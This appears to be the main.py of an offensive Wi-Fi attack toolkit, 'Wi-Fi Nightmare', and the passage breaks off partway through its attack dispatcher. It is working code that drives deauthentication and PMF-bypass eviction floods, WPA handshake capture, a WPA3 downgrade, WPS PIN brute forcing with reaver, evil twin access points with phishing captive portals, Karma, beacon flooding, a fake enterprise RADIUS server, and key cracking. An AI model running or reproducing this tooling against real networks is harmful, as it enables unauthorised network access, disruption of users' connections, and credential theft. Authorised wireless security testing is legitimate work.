# main.py
#!/usr/bin/env python3
import sys
import time
import os
import re
import shutil
import subprocess
import threading
try:
    from scapy.all import sniff, Dot11, EAPOL
    HAS_SCAPY = True
except ImportError:
    sniff = None
    Dot11 = None
    EAPOL = None
    HAS_SCAPY = False

# Allow running directly: python3 wifi_nightmare/main.py
if __name__ == "__main__" and __package__ is None:
    __package__ = "wifi_nightmare"
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import Modules
from wifi_nightmare.config import (
    C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_GREY, C_RESET,
    BAUDRATE, HANDSHAKES_DIR, ESP_HTML_LIMIT
)
import wifi_nightmare.utils as utils
import wifi_nightmare.ui as ui
import wifi_nightmare.portals as portals
from wifi_nightmare.database import DatabaseHandler
from wifi_nightmare.scanner import NetworkScanner, ClientMonitor
from wifi_nightmare.logger import logger, setup_logger
from wifi_nightmare.vif_check import get_vif_info

# Import ESP32 & Attack Modules
try:
    from wifi_nightmare.esp_driver import ESP32Driver
    from wifi_nightmare.handshake import NetworkAttacker
    from wifi_nightmare.eviltwin import EvilTwinAttack
except ImportError:
    ESP32Driver = None
    NetworkAttacker = None
    EvilTwinAttack = None

try:
    from wifi_nightmare.pixie_dust import PixieDustAttack
except ImportError:
    PixieDustAttack = None

from wifi_nightmare.capture_native import capture_handshake
from wifi_nightmare.card_manager import CardManager
from wifi_nightmare.session_export import SessionExporter
from wifi_nightmare.wordlist_manager import WordlistManager
from wifi_nightmare.geo_lookup import GeoLocator

try:
    from wifi_nightmare.pmkid_attack import PMKIDAttack
except ImportError:
    PMKIDAttack = None

try:
    from wifi_nightmare.karma_attack import KarmaAttack
except ImportError:
    KarmaAttack = None

try:
    from wifi_nightmare.beacon_flood import BeaconFlood
except ImportError:
    BeaconFlood = None

try:
    from wifi_nightmare.radius_fake import WPAEnterpriseEvil
except ImportError:
    WPAEnterpriseEvil = None

try:
    from wifi_nightmare.tui_dashboard import TUIDashboard, HAS_RICH
except ImportError:
    TUIDashboard = None
    HAS_RICH = False

class WifiGTR:
    def __init__(self, interface, serial_port=None):
        self.original_interface = interface
        self.interface = interface
        self.serial_port = serial_port
        self.db = DatabaseHandler()
        self.card_mgr = CardManager()
        self.sniffer_interface = interface
        self.injector_interface = interface
        
        utils.check_root()
        utils.check_interface_exists(self.interface)
        
        self.scanner = None
        self.display_list = []
        self.esp_driver = None
        self.vif_info = None
        self.session_exporter = SessionExporter()
        self.wordlist_mgr = WordlistManager()
        self.geo_locator = GeoLocator(
            wigle_api_key=os.environ.get('WIGLE_API_KEY'),
            wigle_api_name=os.environ.get('WIGLE_API_NAME')
        )
        self.tui_dashboard = TUIDashboard(interface=interface) if TUIDashboard else None
        
    def start(self):
        logger.info("Starting Wi-Fi Nightmare")
        
        # 1. Enable Monitor Mode & Auto-Assign Multi-Card Roles
        self.interface = utils.enable_monitor_mode(self.interface)
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        
        # Check Multi-Card Aggregation
        roles = self.card_mgr.auto_assign_roles(preferred_iface=self.interface)
        if roles.get("mode") == "dual":
            self.sniffer_interface = roles["sniffer"]
            self.injector_interface = roles["injector"]
            # Enable monitor on secondary adapter as well
            self.injector_interface = utils.enable_monitor_mode(self.injector_interface)
            utils.run_command(["ip", "link", "set", self.injector_interface, "up"])
            print(f"{C_GREEN}[+] Multi-Card Aggregation ACTIVE:{C_RESET}")
            print(f"    - Sniffer (Continuous Capture): {C_CYAN}{self.sniffer_interface}{C_RESET}")
            print(f"    - Injector (Deauth / CSA / Eviction): {C_YELLOW}{self.injector_interface}{C_RESET}")
        else:
            self.sniffer_interface = self.interface
            self.injector_interface = self.interface
        
        # 2. Connect to ESP32 (if port provided)
        if self.serial_port:
            if ESP32Driver:
                print(f"{C_CYAN}[*] Connecting to ESP on port {self.serial_port}...{C_RESET}")
                logger.info(f"Connecting to ESP on {self.serial_port}")
                self.esp_driver = ESP32Driver(self.serial_port)
                
                if self.esp_driver.connect():
                    print(f"{C_GREEN}[+] ESP Connected Successfully.{C_RESET}")
                else:
                    print(f"{C_RED}[!] Failed to connect to ESP. Running in Standalone Mode.{C_RESET}")
                    logger.error("ESP connection failed")
                    self.esp_driver = None
                    time.sleep(1)
                    input("Press Enter to continue...")
            else:
                print(f"{C_RED}[!] ESP Modules missing. Running in Standalone Mode.{C_RESET}")
                input("Press Enter to continue...")
        else:
            print(f"{C_YELLOW}[*] No Serial Port provided. Running in Standalone Mode (No ESP features).{C_RESET}")
            logger.info("Running in standalone mode")
            input("Press Enter to continue...")

        # 3. Check VIF support (for software Evil Twin)
        print(f"{C_CYAN}[*] Checking Virtual Interface (VIF) support...{C_RESET}")
        self.vif_info = get_vif_info(self.interface)
        if self.vif_info["ready"]:
            print(f"{C_GREEN}[+] VIF Supported — Software Evil Twin available{C_RESET}")
        elif self.vif_info["supported"]:
            missing_tools = []
            if not self.vif_info["has_hostapd"]:
                missing_tools.append("hostapd")
            if not self.vif_info["has_dnsmasq"]:
                missing_tools.append("dnsmasq")
            print(f"{C_YELLOW}[*] VIF supported but missing: {', '.join(missing_tools)}{C_RESET}")
            print(f"{C_YELLOW}    Install: sudo apt-get install {' '.join(missing_tools)}{C_RESET}")
        else:
            print(f"{C_GREY}[-] VIF not supported ({self.vif_info['info']}){C_RESET}")
        logger.info(f"VIF info: {self.vif_info}")

        # 4. Start Scanner
        self.scanner = NetworkScanner(self.interface, self.db)
        self.main_loop()

    def main_loop(self):
        while True:
            try:
                # Show ESP Status
                if self.esp_driver and self.esp_driver.is_connected:
                    esp_status = f"{C_GREEN}Connected ({self.serial_port}){C_RESET}"
                else:
                    esp_status = f"{C_GREY}Not Connected{C_RESET}"
                
                # Show VIF Status
                if self.vif_info and self.vif_info["ready"]:
                    vif_status = f"{C_GREEN}Supported{C_RESET}"
                elif self.vif_info and self.vif_info["supported"]:
                    vif_status = f"{C_YELLOW}Partial{C_RESET}"
                else:
                    vif_status = f"{C_GREY}Not Supported{C_RESET}"

                ui.print_main_menu(self.interface, esp_status, vif_status)
                
                choice = ui.menu_input("Select Option: ")
                
                if choice == '1':   # Scan
                    self.scan_workflow()
                elif choice == '2': # Client Monitor
                    if not self.scanner: 
                        print(f"{C_RED}[!] Error: Scanner not initialized.{C_RESET}")
                        continue
                    monitor = ClientMonitor(self.scanner)
                    monitor.start()
                    input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
                elif choice == '3': # Mass Attack
                    self.run_mass_attack()
                elif choice == '4': # Database
                    self.database_workflow()
                elif choice == '5': # Export Session
                    self.session_exporter.interactive_export(
                        self.scanner.networks if self.scanner else {},
                        self.db,
                        self.interface
                    )
                elif choice == '6': # Geo-Location Lookup
                    self.geo_locator.interactive_lookup(
                        self.scanner.networks if self.scanner else {}
                    )
                elif choice == '0':
                    self.cleanup()
                    sys.exit()
                else:
                    print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                    time.sleep(1)
            except KeyboardInterrupt:
                self.cleanup()
                sys.exit()

    def run_pixie_dust_workflow(self, bssid, channel, ssid):
        if PixieDustAttack is None:
            print(f"{C_RED}[!] Pixie Dust module not available.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}--- WPS ATTACK SUITE ---{C_RESET}")
        print(f"Target  : {C_GREEN}{ssid}{C_RESET}")
        print(f"BSSID   : {utils.mask_bssid(bssid)}")
        print(f"Channel : {C_YELLOW}{channel}{C_RESET}")
        print("------------------------")
        print(f"{C_WHITE}[1] Pixie Dust Attack (Offline PRNG Key Recovery){C_RESET}")
        print(f"{C_WHITE}[2] Push-Button Sniffer (PBC - Instant PSK Capture){C_RESET}")
        print(f"{C_WHITE}[3] Algorithmic Known-PINs (ComputePIN / D-Link / EasyBox){C_RESET}")
        
        wps_choice = input(f"{C_YELLOW}[?]{C_RESET} Select WPS Method [1]: ").strip()
        
        if wps_choice == '2':
            # Push-Button PBC Capture
            try:
                from wifi_nightmare.wps_suite import WPSPbcSniffer
                sniffer = WPSPbcSniffer(self.sniffer_interface, bssid, channel, ssid)
                res = sniffer.listen_for_pbc(timeout=120)
                if res and res.success:
                    self.db.save(bssid, ssid)
                    self.db.update_wps_info(bssid, res.pin, res.psk)
            except Exception as e:
                print(f"{C_RED}[!] PBC Attack error: {e}{C_RESET}")
            input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
            return
        elif wps_choice == '3':
            # Algorithmic Known PINs
            try:
                from wifi_nightmare.wps_suite import KnownPinDatabase
                pins = KnownPinDatabase.get_suggested_pins(bssid)
                print(f"\n{C_CYAN}[+] Algorithmic PINs for {utils.mask_bssid(bssid)}:{C_RESET}")
                for i, p in enumerate(pins, 1):
                    print(f"    {C_GREEN}{i}. PIN: {p}{C_RESET}")

                if shutil.which("reaver"):
                    try_test = input(f"\n{C_YELLOW}[?] Automatically test these PINs against target with reaver? (y/n) [y]: {C_RESET}").strip().lower()
                    if try_test != 'n':
                        utils.run_command(["ip", "link", "set", self.sniffer_interface, "up"])
                        utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])
                        for pin in pins:
                            print(f"\n{C_YELLOW}[*] Testing PIN: {pin} on {utils.mask_bssid(bssid)} (Channel {channel})...{C_RESET}")
                            cmd = ["reaver", "-i", self.injector_interface, "-b", bssid, "-c", str(channel), "-p", pin, "-vv", "-N", "-T", "1"]
                            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                            success = False
                            psk = ""
                            try:
                                while proc.poll() is None:
                                    line = proc.stdout.readline()
                                    if not line:
                                        time.sleep(0.05)
                                        continue
                                    l_str = line.strip()
                                    if "WPA PSK:" in l_str:
                                        psk = l_str.split("WPA PSK:")[-1].strip().strip("'\"").split()[0]
                                        success = True
                                        print(f"\n{C_GREEN}[+] [SUCCESS] Correct PIN Found: {pin} | PSK: {psk}{C_RESET}")
                                        self.db.save(bssid, ssid)
                                        self.db.update_wps_info(bssid, pin, psk)
                                        proc.terminate()
                                        break
                                    elif "WPS transaction failed" in l_str or "Pin cracked in" in l_str:
                                        break
                            except KeyboardInterrupt:
                                proc.terminate()
                                print(f"\n{C_YELLOW}[*] PIN testing aborted by user.{C_RESET}")
                                break
                            if success:
                                break
                else:
                    print(f"\n{C_GREY}[i] Install 'reaver' (sudo apt install reaver) to automatically test PINs.{C_RESET}")
            except Exception as e:
                print(f"{C_RED}[!] Error calculating PINs: {e}{C_RESET}")
            input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
            return

        try:
            from wifi_nightmare.config import PIXIE_DUST_TIMEOUT
            timeout = PIXIE_DUST_TIMEOUT
        except ImportError:
            timeout = 120

        attacker = PixieDustAttack(
            interface=self.injector_interface,
            target_bssid=bssid,
            target_channel=channel,
            target_ssid=ssid,
            timeout=timeout
        )

        result = None

        with utils.SignalManager() as sig:
            def _attack_thread():
                nonlocal result
                result = attacker.run()

            t = threading.Thread(target=_attack_thread, daemon=True)
            t.start()

            while t.is_alive():
                if sig.stopped:
                    attacker.stop()
                    break
                t.join(timeout=0.5)

        if sig.stopped:
            print(f"\n{C_YELLOW}[*] Pixie Dust attack interrupted.{C_RESET}")
        elif result:
            self.db.save(bssid, result.ssid if result.ssid and result.ssid != "Unknown" else ssid)
            if result.pin:
                self.db.update_wps_info(bssid, result.pin, result.psk or "")

        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_software_eviltwin(self, bssid, channel, ssid):
        if not self.vif_info or not self.vif_info["ready"]:
            if self.vif_info and not self.vif_info["supported"]:
                print(f"{C_RED}[!] Your adapter does not support Virtual Interfaces (VIF).{C_RESET}")
                print(f"{C_YELLOW}    Adapter info: {self.vif_info['info']}{C_RESET}")
            elif self.vif_info:
                missing = []
                if not self.vif_info["has_hostapd"]:
                    missing.append("hostapd")
                if not self.vif_info["has_dnsmasq"]:
                    missing.append("dnsmasq")
                print(f"{C_RED}[!] Missing tools for Software Evil Twin: {', '.join(missing)}{C_RESET}")
                print(f"{C_YELLOW}    Install: sudo apt-get install {' '.join(missing)}{C_RESET}")
            else:
                print(f"{C_RED}[!] VIF check not completed.{C_RESET}")
            input("Press Enter...")
            return

        try:
            from evil_twin_software import SoftwareEvilTwin, preflight_cloudflared
        except ImportError:
            print(f"{C_RED}[!] Software Evil Twin module not found.{C_RESET}")
            input("Press Enter...")
            return

        cloudflared_bin = preflight_cloudflared()

        print(f"\n{C_CYAN}[*] Checking for existing Handshake...{C_RESET}")
        info = self.db.get_info(bssid)

        has_handshake = False
        if info and info.get('Handshake'):
            if info.get('HSFile') and os.path.exists(info['HSFile']):
                has_handshake = True

        if not has_handshake:
            print(f"{C_YELLOW}[!] No handshake for {ssid}. Capturing first...{C_RESET}")
            time.sleep(1)
            self.run_attack((bssid, channel), mode="handshake", auto_exit=True)
            info = self.db.get_info(bssid)
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']
            if not (info and info.get('Handshake') and os.path.exists(info.get('HSFile', ''))):
                print(f"{C_RED}[-] Failed to capture handshake.{C_RESET}")
                input("Press Enter...")
                return
        else:
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']

        if ssid == "<HIDDEN>" or ssid == "Unknown":
            manual = input(f"{C_YELLOW}[?] Enter SSID manually (empty to abort): {C_RESET}").strip()
            if not manual:
                return
            ssid = manual
            self.db.save(bssid, ssid)

        # Portal selection
        portal_html = None
        templates = portals.list_templates()
        has_custom = os.path.exists("custom_portal.html")

        print(f"\n{C_CYAN}[*] Select captive portal:{C_RESET}")
        for i, name in enumerate(templates, 1):
            print(f"  [{i}] {name}")
        if has_custom:
            print(f"  [C] Custom portal (custom_portal.html)")
        print(f"  [D] Default (built-in)")
        print()

        choice = input(f"{C_YELLOW}[?]{C_RESET} Portal [D]: ").strip().lower()

        if choice == 'c' and has_custom:
            try:
                with open("custom_portal.html", "r", encoding="utf-8") as f:
                    portal_html = f.read()
                print(f"{C_GREEN}[+] Using custom portal ({len(portal_html)} bytes){C_RESET}")
            except Exception:
                pass
        elif choice.isdigit() and 1 <= int(choice) <= len(templates):
            name = templates[int(choice) - 1]
            portal_html = portals.get_template(name)
            print(f"{C_GREEN}[+] Using: {name}{C_RESET}")
        else:
            print(f"{C_GREEN}[+] Using default portal{C_RESET}")

        print(f"\n{C_CYAN}[*] Starting Software Evil Twin on: {ssid} (CH {channel}){C_RESET}")

        et = SoftwareEvilTwin(
            interface=self.original_interface,
            target_bssid=bssid,
            target_channel=channel,
            target_ssid=ssid,
            db_handler=self.db,
            portal_html=portal_html,
            cloudflared_bin=cloudflared_bin
        )
        et.run()
        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def cleanup(self):
        print(f"\n{C_YELLOW}[*] Shutting down...{C_RESET}")
        logger.info("Shutting down")
        
        # Stop ESP32 safely (close() sends STOP command and closes serial)
        if self.esp_driver and self.esp_driver.is_connected:
            print(f"{C_RED}[*] Stopping ESP...{C_RESET}")
            self.esp_driver.close()
            print(f"{C_GREEN}[+] ESP Stopped.{C_RESET}")
            
        # Restore the ORIGINAL interface (not self.interface which may have changed to wlan0mon)
        restore_iface = getattr(self, 'original_interface', self.interface)
        utils.restore_managed_mode(restore_iface)
        
        print(f"{C_YELLOW}[*] Exiting.{C_RESET}")

    def _refresh_ssid_from_db(self, bssid):
        """Carry a decloaked SSID from the database into the live scan entry
        and return the current display name.

        The reveal flow only writes the name to the DB (handshake.py saves it
        on the frame that decloaks the network); the scan-table entry stays
        '<HIDDEN>' until a fresh beacon comes in. This refreshes it right away
        so the target menu and following actions use the revealed name instead
        of re-showing '<HIDDEN>' while still remembering it (it is also picked
        up again on every later scan through the DB merge in scanner.py).
        """
        net_info = self.scanner.networks.get(bssid)
        if net_info is None:
            return "Unknown"

        db_info = self.db.get_info(bssid)
        if isinstance(db_info, dict):
            saved = str(db_info.get('SSID', '') or '')
        elif db_info:
            saved = str(db_info)
        else:
            saved = ""

        current = net_info.get('SSID', '')
        if (saved and saved not in ("<HIDDEN>", "Unknown")
                and current in ("<HIDDEN>", "Unknown", "")):
            with self.scanner.lock:
                net_info['SSID'] = saved
                net_info['Hidden'] = False
                net_info['Known'] = True
            return saved
        return current

    def scan_workflow(self):
        # Monitor mode is already enabled in start() — just ensure the interface is up
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        
        self.run_scanner_process()
        
        if not self.display_list:
            input("No networks found. Press Enter...")
            return

        target = self.select_target_from_list()
        if not target: return 

        bssid, channel = target
        net_info = self.scanner.networks[bssid]

        while True:
            # Refresh the name every iteration: a Reveal/attack may have just
            # decloaked this hidden network and saved the SSID to the DB.
            ssid_name = self._refresh_ssid_from_db(bssid)
            client_count = len(self.scanner.networks[bssid].get('Clients', []))
            ui.print_target_menu(
                ssid=ssid_name,
                bssid=bssid,
                channel=channel,
                client_count=client_count,
                crypto=net_info.get('Crypto', 'Unknown'),
                vendor=net_info.get('Vendor', 'Unknown'),
                has_esp=bool(self.esp_driver and self.esp_driver.is_connected),
                vif_ready=bool(self.vif_info and self.vif_info.get("ready")),
                has_wps=bool(net_info.get('WPS')),
            )

            action = ui.menu_input("Select Action: ")

            if action == '1': # Handshake
                self.run_attack((bssid, channel), mode="handshake")
            elif action == '2': # Reveal
                self.run_attack((bssid, channel), mode="reveal")
            elif action == '3': # Multi-Vector Eviction (PMF Bypass)
                self.run_multivector_eviction(bssid, channel, ssid_name)
            elif action == '4': # Passive
                self.run_attack((bssid, channel), mode="passive")
            elif action == '5': # Gen Hash
                # Generate hc22000
                info = self.db.get_info(bssid)
                if info and info.get('HSFile') and os.path.exists(info['HSFile']):
                     utils.generate_hc22000(info['HSFile'])
                     input("Press Enter to return to menu...")
                else:
                    print(f"{C_RED}[!] No handshake file found for this target.{C_RESET}")
                    if info and info.get('HSFile'):
                         print(f"    Missing file: {info['HSFile']}")
                    print(f"{C_YELLOW}[*] Capture a handshake first (Option 1).{C_RESET}")
                    time.sleep(2)
            elif action == '6': # Evil Twin Logic (ESP)
                if self.esp_driver and self.esp_driver.is_connected:
                    self.run_eviltwin_workflow(bssid, channel, ssid_name)
                else:
                    time.sleep(1)
            elif action == '7': # Software Evil Twin
                self.run_software_eviltwin(bssid, channel, ssid_name)
            elif action == '8': # Pixie Dust
                if not PixieDustAttack:
                    print(f"{C_RED}[!] Pixie Dust module not loaded.{C_RESET}")
                    time.sleep(1)
                else:
                    if not net_info.get('WPS'):
                        print(f"{C_YELLOW}[!] WPS not detected on this target. Attack may fail.{C_RESET}")
                        confirm = input(f"{C_YELLOW}[?] Try anyway? (y/n): {C_RESET}").strip().lower()
                        if confirm != 'y':
                            continue
                    self.run_pixie_dust_workflow(bssid, channel, ssid_name)
            elif action == '9': # Crack with aircrack-ng
                self.run_aircrack_crack(bssid, ssid_name)
            elif action == '10': # WPA3 Downgrade Attack
                self.run_wpa3_downgrade(bssid, channel, ssid_name)
            elif action == '11': # PMKID Attack
                self.run_pmkid_attack(bssid, channel, ssid_name)
            elif action == '12': # Karma Attack
                self.run_karma_attack(bssid, channel, ssid_name)
            elif action == '13': # Beacon Flood
                self.run_beacon_flood(bssid, channel, ssid_name)
            elif action == '14': # WPA Enterprise Evil Twin
                self.run_wpa_enterprise(bssid, channel, ssid_name)
            elif action == '15': # Smart Crack
                self.run_smart_crack(bssid, ssid_name)
            elif action == '0':
                break
            else:
                print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                time.sleep(1)

    def run_multivector_eviction(self, bssid, channel, ssid):
        """Run intelligent multi-vector eviction (Deauth + CSA + BTM) to bypass PMF."""
        print(f"\n{C_CYAN}--- MULTI-VECTOR EVICTION (PMF BYPASS SUITE) ---{C_RESET}")
        print(f"Target   : {C_GREEN}{ssid}{C_RESET}")
        print(f"BSSID    : {utils.mask_bssid(bssid)}")
        print(f"Channel  : {C_YELLOW}{channel}{C_RESET}")
        print("------------------------------------------------")
        print(f"{C_WHITE}[1] Intelligent Hybrid (Deauth + CSA + BTM) [Default]{C_RESET}")
        print(f"{C_WHITE}[2] PMF Stealth Only (CSA + 802.11v BTM - No Deauth){C_RESET}")
        print(f"{C_WHITE}[3] Standard Deauth Burst Flood{C_RESET}")
        choice = input(f"{C_YELLOW}[?]{C_RESET} Mode [1]: ").strip() or '1'

        utils.run_command(["ip", "link", "set", self.interface, "up"])
        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
        if self.injector_interface != self.interface:
            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])

        try:
            from wifi_nightmare.eviction import AdvancedEviction
            engine = AdvancedEviction(self.injector_interface, bssid, channel, ssid)
        except Exception as e:
            print(f"{C_RED}[!] Could not load eviction engine: {e}{C_RESET}")
            return

        pmf_mode = (choice == '2')
        deauth_only = (choice == '3')

        print(f"\n{C_GREEN}[*] Eviction Active on {utils.mask_bssid(bssid)} (Channel {channel}) | Ctrl+C to Stop...{C_RESET}")
        total_packets = 0
        start = time.time()

        with utils.SignalManager() as sig:
            while not sig.stopped:
                try:
                    if deauth_only:
                        sent = engine.send_deauth_burst(count=5)
                    elif pmf_mode:
                        sent = engine.send_csa_burst(count=4)
                    else:
                        sent = engine.evict_client(client_mac=None, pmf_active=False)
                    total_packets += sent
                    elapsed = time.time() - start
                    sys.stdout.write(f"\r{C_YELLOW}[+] Eviction frames injected: {total_packets} | {elapsed:.1f}s active{C_RESET}   ")
                    sys.stdout.flush()
                    time.sleep(0.3)
                except Exception as e:
                    logger.debug(f"Eviction loop error: {e}")
                    time.sleep(1)

        input(f"\n\n{C_YELLOW}Press Enter to return to menu...{C_RESET}")

    def run_wpa3_downgrade(self, bssid, channel, ssid):
        """WPA3/SAE Transition Mode Downgrade Attack.
        
        Clones target AP beacons with WPA2-PSK only while injecting Channel Switch
        Announcements (CSA) on the original AP. Forces clients supporting both WPA3/WPA2
        to downgrade and complete a standard 4-way handshake (crackable M2).
        """
        print(f"\n{C_CYAN}--- WPA3/SAE TRANSITION DOWNGRADE ATTACK ---{C_RESET}")
        print(f"Target   : {C_GREEN}{ssid}{C_RESET}")
        print(f"BSSID    : {utils.mask_bssid(bssid)}")
        print(f"Channel  : {C_YELLOW}{channel}{C_RESET}")
        print(f"{C_YELLOW}[i] Injecting CSA frames to evict clients from WPA3 (PMF-protected)...{C_RESET}")

        # Lock the injector card to the target's channel FIRST. Without this,
        # the CSA burst below transmits on whatever channel the injector
        # happened to be left on by a previous attack -- the frames never
        # reach this target's clients at all, silently.
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
        if self.injector_interface != self.interface:
            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])

        try:
            from wifi_nightmare.eviction import AdvancedEviction
            eviction = AdvancedEviction(self.injector_interface, bssid, channel, ssid)
            # Continuous CSA eviction burst
            eviction.send_csa_burst(count=6)
        except Exception as e:
            logger.debug(f"CSA trigger failed: {e}")

        # Start handshake capture immediately
        self.run_attack((bssid, channel), mode="handshake")

    def run_eviltwin_workflow(self, bssid, channel, ssid):
        if not self.esp_driver or not self.esp_driver.is_connected:
            print(f"\n{C_RED}[!] Error: ESP connection lost.{C_RESET}")
            return

        print(f"\n{C_CYAN}[*] Checking for existing Handshake...{C_RESET}")
        info = self.db.get_info(bssid)
        
        has_handshake = False
        if info and info.get('Handshake'):
            if info.get('HSFile') and os.path.exists(info['HSFile']):
                has_handshake = True
        
        if not has_handshake:
            print(f"{C_YELLOW}[!] No handshake found for {ssid}. Starting Capture Attack first...{C_RESET}")
            time.sleep(1)
            
            # 1. Run attack (Reveal + Handshake)
            self.run_attack((bssid, channel), mode="handshake", auto_exit=True)
            
            # 2. Update DB info
            info = self.db.get_info(bssid)
            
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']
                print(f"{C_GREEN}[+] Target Decloaked: {ssid}{C_RESET}")

            # Verify handshake again
            if info and info.get('Handshake') and os.path.exists(info.get('HSFile', '')):
                print(f"{C_GREEN}[+] Handshake captured successfully.{C_RESET}")
                time.sleep(1)
            else:
                print(f"{C_RED}[-] Failed to capture handshake. Cannot start Evil Twin.{C_RESET}")
                # Debug info
                if info:
                    print(f"[Debug] DB Info: HS={info.get('Handshake')}, File={info.get('HSFile')}")
                else:
                    print("[Debug] Info is None")
                input("Press Enter...")
                return
        else:
            print(f"{C_GREEN}[+] Found valid handshake: {info['HSFile']}{C_RESET}")
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']
        
        # Final check for SSID before starting Evil Twin
        if ssid == "<HIDDEN>" or ssid == "Unknown":
             print(f"{C_YELLOW}[!] SSID could not be automatically revealed.{C_RESET}")
             manual_ssid = input(f"{C_YELLOW}[?] Enter SSID manually (or leave empty to abort): {C_RESET}").strip()
             if manual_ssid:
                 ssid = manual_ssid
                 self.db.save(bssid, ssid)
             else:
                 print(f"{C_RED}[!] Aborted.{C_RESET}")
                 return

        print(f"{C_CYAN}[*] Proceeding to Evil Twin with SSID: {ssid}{C_RESET}")

        if EvilTwinAttack:
            et_attack = EvilTwinAttack(self.esp_driver, self.db, bssid, channel, ssid, interface=self.injector_interface)
            et_attack.run()
        else:
            print(f"{C_RED}[!] Error: EvilTwin module not loaded.{C_RESET}")
        
        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_scanner_process(self):
        self.scanner.stop_sniffing = False

        with utils.SignalManager() as sig:
            hopper = threading.Thread(target=self.scanner.channel_hopper, daemon=True)
            hopper.start()

            try:
                last_print = 0
                while not self.scanner.stop_sniffing and not sig.stopped:
                    try:
                        sniff(iface=self.sniffer_interface, prn=self.scanner.packet_handler, count=0, timeout=0.1, store=0)
                    except OSError:
                        utils.run_command(["ip", "link", "set", self.sniffer_interface, "up"])
                        continue

                    if time.time() - last_print > 0.5:
                        if self.tui_dashboard and HAS_RICH:
                            self.tui_dashboard.update(self.scanner.networks, self.scanner.lock)
                            self.display_list = self.tui_dashboard.render_rich()
                        else:
                            self.display_list = ui.print_scan_table(self.interface, self.scanner.networks, self.scanner.lock)
                        last_print = time.time()
            except KeyboardInterrupt:
                self.scanner.stop_sniffing = True

        print(f"\n{C_YELLOW}[!] Scan Stopped.{C_RESET}")

    def select_target_from_list(self):
        while True:
            try:
                choice = input(f"\n[?] Select Network ID (Enter to cancel): ").strip()
                if choice == "": return None
                
                if not choice.isdigit():
                    print(f"{C_RED}[!] Please enter a valid number.{C_RESET}")
                    continue
                    
                idx = int(choice)
                if 0 <= idx < len(self.display_list):
                    bssid = self.display_list[idx]
                    channel = self.scanner.networks[bssid]['Channel']
                    print(f"\n{C_GREEN}[+] Target Selected: {utils.mask_bssid(bssid)} (CH: {channel}){C_RESET}")
                    utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
                    return (bssid, channel)
                else:
                    print(f"{C_RED}[!] Invalid ID. Choose 0-{len(self.display_list)-1}.{C_RESET}")
            except Exception as e:
                logger.error(f"Input error: {e}")
                return None

    def run_mass_attack(self):
        if not self.display_list:
            print(f"{C_RED}[!] You must Scan first to populate targets.{C_RESET}")
            self.run_scanner_process()

        if not self.display_list:
            print(f"{C_YELLOW}[!] No networks found during scan.{C_RESET}")
            input("Press Enter...")
            return

        if NetworkAttacker is None:
            print(f"{C_RED}[!] NetworkAttacker module not available.{C_RESET}")
            input("Press Enter...")
            return
            
        hidden_targets = []
        for bssid in self.display_list:
            net = self.scanner.networks[bssid]
            if net['Hidden'] and not net['Known']: 
                hidden_targets.append((bssid, net['Channel']))
        
        if not hidden_targets:
            print(f"{C_RED}[-] No unknown hidden networks found.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}[*] Found {len(hidden_targets)} hidden networks.{C_RESET}")
        try: 
            user_input = input(f"[?] Duration per network (seconds, default 30): ").strip()
            duration = int(user_input) if user_input else 30
        except ValueError: 
            duration = 30
            
        print(f"{C_YELLOW}[*] Starting Mass Attack... (Ctrl+C to Skip current){C_RESET}")
        
        results_count = 0
        for i, (bssid, channel) in enumerate(hidden_targets):
            print(f"\n{C_WHITE}--- Target {i+1}/{len(hidden_targets)}: {utils.mask_bssid(bssid)} ---{C_RESET}")
            utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
            # NetworkAttacker below injects deauth on self.injector_interface,
            # NOT self.interface. In dual-card mode those are different
            # physical cards -- without this, the injector stays parked on
            # whatever channel the PREVIOUS target left it on while iterating
            # through multiple hidden networks, so deauth silently misses
            # every target after the first.
            if self.injector_interface != self.interface:
                utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])

            attacker = NetworkAttacker(
                interface=self.injector_interface,
                target_bssid=bssid,
                target_channel=channel,
                db_handler=self.db,
                attack_mode="reveal"
            )
            
            with utils.SignalManager() as sig:
                attacker.start_deauth_thread()
                
                start_time = time.time()
                while not attacker.success and not sig.stopped:
                    if time.time() - start_time > duration:
                        break 
                    try:
                        sniff(iface=self.sniffer_interface, prn=attacker.sniffer_callback, count=0, timeout=0.5, store=0)
                    except OSError:
                        utils.run_command(["ip", "link", "set", self.interface, "up"])

            attacker.stop_attack = True 
            attacker.join_threads()

            if attacker.success and attacker.result_data:
                self.db.save(bssid, attacker.result_data['SSID'])
                print(f"\n{C_GREEN}[+] SUCCESS: {utils.mask_bssid(bssid)} -> {attacker.result_data['SSID']}{C_RESET}")
                results_count += 1
        
        print(f"\n{C_CYAN}=== Mass Attack Finished. Revealed: {results_count} ==={C_RESET}")
        input("Press Enter...")

    def run_attack(self, target, mode="reveal", auto_exit=False):
        bssid, channel = target
        current_ssid = self.scanner.networks[bssid]['SSID']
